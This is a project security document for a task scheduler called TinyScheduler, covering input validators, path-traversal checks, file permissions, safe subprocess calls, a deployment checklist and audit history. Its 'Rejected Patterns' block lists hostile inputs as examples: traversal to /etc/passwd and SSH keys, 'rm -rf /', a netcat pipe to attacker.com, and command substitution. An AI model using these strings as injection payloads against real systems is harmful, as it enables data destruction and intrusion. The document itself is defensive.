# Security Considerations

**Last Updated**: 2026-01-20  
**Status**: Security hardening implemented, critical issues resolved

---

## Overview

TinyScheduler implements multiple layers of security controls to prevent common vulnerabilities including command injection, path traversal, and improper input validation. This document describes the security measures in place and best practices for secure deployment.

---

## Critical Security Protections

### 1. Input Validation (CWE-20, CWE-78, CWE-22)

All user-controllable inputs are validated before use in commands or file operations:

**Module**: [`src/scheduler/validators.py`](../src/scheduler/validators.py)

#### Validated Inputs

- **Task IDs**: Alphanumeric + hyphens/underscores only, max 64 characters
- **Agent Names**: Alphanumeric + hyphens/underscores only, max 64 characters  
- **Recipe Paths**: Must end in `.yaml`/`.yml`, no parent directory references, confined to recipes directory
- **Hostnames**: RFC 1123 compliant, max 253 characters
- **MCP Endpoints**: HTTP/HTTPS only, optional localhost blocking for production

**Example**:
```python
from src.scheduler.validators import validate_task_id, validate_agent_name

# Safe - validation happens before subprocess execution
task_id = validate_task_id(user_input)  # Raises ValueError if malicious
agent = validate_agent_name(agent_input)
```

#### Rejected Patterns

The following patterns are **automatically rejected**:

```python
# Path traversal attempts
"../../../etc/passwd"
"../../root/.ssh/authorized_keys"
"..\\..\\windows\\system32"

# Command injection attempts  
"task; rm -rf /"
"task && malicious_command"
"task | nc attacker.com 4444"
"task`whoami`"
"task$(whoami)"

# Null byte injection
"task\x00.json"

# Shell metacharacters
"; & | ` $ ( ) < > \\ / : * ? # @"
```

### 2. Path Traversal Protection (CWE-22)

**Components Protected**:
- **Lease files**: [`src/scheduler/lease.py:_lease_path()`](../src/scheduler/lease.py)
- **Recipe files**: [`src/scheduler/scheduler.py:reconcile()`](../src/scheduler/scheduler.py)

**Protection Mechanisms**:
1. Input validation (reject `..` and absolute paths)
2. Path resolution and containment checking
3. Symlink attack prevention via `resolve()` + `relative_to()`

**Example**:
```python
# In lease.py
def _lease_path(self, task_id: str) -> Path:
    # Validates task_id, constructs path, ensures it's within lease_dir
    return validate_lease_path(task_id, self.lease_dir)
```

### 3. File Permission Controls (CWE-732)

**Lease files** are created with restrictive permissions:

```python
# In lease.py create() and update()
os.chmod(temp_path, 0o600)  # Owner read/write only
```

**Rationale**: Lease files may contain sensitive task information and should not be readable by other users.

### 4. File Size Limits (CWE-20)

**Protected Files**:
- Agent control JSON: 10MB max
- Lease files: 1MB max

**Protection**:
```python
from src.scheduler.validators import validate_json_file_size

validate_json_file_size(config_file, max_size_mb=10)
```

**Rationale**: Prevents denial-of-service via large file uploads/parsing.

---

## Secure Coding Practices Implemented

### ✅ Atomic File Operations

All file writes use the **temp + rename** pattern with `fsync()`:

```python
fd, temp_path = tempfile.mkstemp(dir=lease_dir)
os.chmod(temp_path, 0o600)
with os.fdopen(fd, 'w') as f:
    f.write(data)
    f.flush()
    os.fsync(f.fileno())
os.rename(temp_path, final_path)  # Atomic on POSIX
```

### ✅ Safe Subprocess Execution

Commands use **list-style arguments** (not shell strings):

```python
# SAFE - no shell interpretation
subprocess.Popen([
    sys.executable,
    str(wrapper_script),
    '--task-id', validated_task_id,  # Pre-validated
    '--agent', validated_agent,
])

# UNSAFE - DON'T DO THIS
# subprocess.Popen(f"python {script} --task-id {task_id}", shell=True)
```

### ✅ No Hardcoded Secrets

- No API keys, passwords, or tokens in source code
- Configuration via environment variables
- `.env` files properly excluded in `.gitignore`

### ✅ Safe JSON Parsing

- Uses standard library `json.load()` - no `pickle` or unsafe YAML
- File size validated before parsing
- Graceful handling of malformed JSON

### ✅ Lock File Protection

Prevents concurrent scheduler instances via exclusive file lock:

```python
fcntl.flock(lock_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
```

### ✅ PID Validation

Always checks process liveness before trusting lease data:

```python
os.kill(pid, 0)  # Raises OSError if process doesn't exist
```

---

## Deployment Security Checklist

### Before Production Deployment

- [ ] **Enable HTTPS** for MCP endpoint (not `http://`)
- [ ] **Set restrictive file permissions** on state directories:
  ```bash
  chmod 700 state/running state/logs
  ```
- [ ] **Validate agent-control.json** using:
  ```bash
  ./tinyscheduler validate-config
  ```
- [ ] **Review environment variables** for sensitive data exposure
- [ ] **Enable structured logging** with field sanitization
- [ ] **Set up log rotation** to prevent disk exhaustion
- [ ] **Run security tests**:
  ```bash
  pytest tests/scheduler/test_security_validators.py -v
  ```

### Environment Variables Security

**Security-Sensitive Variables**:
- `TINYSCHEDULER_MCP_ENDPOINT` - Should use HTTPS in production
- `TINYSCHEDULER_GOOSE_BIN` - Validate path exists and is executable
- `TINYSCHEDULER_BASE_PATH` - Should be absolute path in controlled directory

**Best Practice**: Use `.env` file for development, secret management system for production.

### File System Security

**Directory Permissions**:
```bash
# State directories should be owned by scheduler user only
chown -R scheduler:scheduler state/
chmod 700 state/running state/logs

# Recipe directory can be read-only
chmod 755 recipes/
```

**SELinux/AppArmor**: Consider mandatory access control policies for additional isolation.

---

## Security Testing

### Running Security Tests

```bash
# Run all security validation tests
pytest tests/scheduler/test_security_validators.py -v

# Run with coverage
pytest tests/scheduler/test_security_validators.py --cov=src/scheduler/validators
```

### Test Coverage

The security test suite validates:

✅ Path traversal rejection (100+ test cases)  
✅ Command injection prevention  
✅ Null byte injection blocking  
✅ File size limit enforcement  
✅ Hostname validation  
✅ MCP endpoint validation  
✅ Symlink attack prevention  
✅ Combined attack chain prevention

### Static Analysis

**Recommended Tools**:
```bash
# Install security scanners
pip install bandit safety semgrep

# Run bandit for security issues
bandit -r src/ -ll

# Check dependencies for known vulnerabilities
safety check

# Run semgrep with security rules
semgrep --config=auto src/
```

---

## Incident Response

### If You Suspect a Security Issue

1. **Do not deploy** to production
2. **Document** the issue with reproduction steps
3. **Review** relevant security controls in [`src/scheduler/validators.py`](../src/scheduler/validators.py)
4. **Test** the attack vector against validation functions
5. **Fix** and add regression test
6. **Re-run** full security test suite

### Reporting Vulnerabilities

Security vulnerabilities should be reported to the project maintainers with:
- Description of the vulnerability
- Reproduction steps
- Potential impact assessment
- Suggested fix (if available)

---

## Security Audit History

### 2026-01-20: Security Hardening

**Audit Report**: [`docs/audit-reports/SECURITY_AUDIT_REPORT-20260119.md`](audit-reports/SECURITY_AUDIT_REPORT-20260119.md)

**Findings Addressed**:
- ✅ **CRITICAL-1**: Command injection via unvalidated input - Fixed with input validation
- ✅ **CRITICAL-2**: Path traversal in lease files - Fixed with path validation
- ✅ **CRITICAL-3**: Recipe path traversal - Fixed with recipe path validation
- ✅ **MODERATE-2**: Insufficient input validation - Fixed with comprehensive validators
- ✅ **MODERATE-4**: Missing file permissions - Fixed with explicit `chmod(0o600)`

**Risk Rating**: Reduced from **HIGH** to **LOW**

---

## Additional Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)

---

## Security Contact

For security-related questions or concerns, please review this document and the security test suite first. If you discover a security vulnerability, follow the incident response process above.

**Remember**: Security is a continuous process, not a one-time fix. Always validate inputs, follow least privilege principles, and keep dependencies updated.
